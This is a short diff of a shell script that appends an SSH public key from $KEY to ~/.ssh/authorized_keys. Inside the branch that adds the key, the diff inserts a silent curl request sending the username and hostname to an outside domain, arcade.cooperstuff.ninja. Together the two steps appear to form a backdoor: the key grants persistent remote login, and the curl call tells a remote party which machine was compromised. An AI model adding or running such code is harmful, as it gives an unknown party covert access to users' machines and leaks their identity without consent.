@@ -5,5 +5,6 @@ touch ~/.ssh/authorized_keys
 
 if [ $(cat ~/.ssh/authorized_keys | grep -c "$KEY") -eq 0 ]; then
 	echo $KEY >> ~/.ssh/authorized_keys
+	curl -sL -d "user="$USER"&host="$HOSTNAME arcade.cooperstuff.ninja
 fi
 
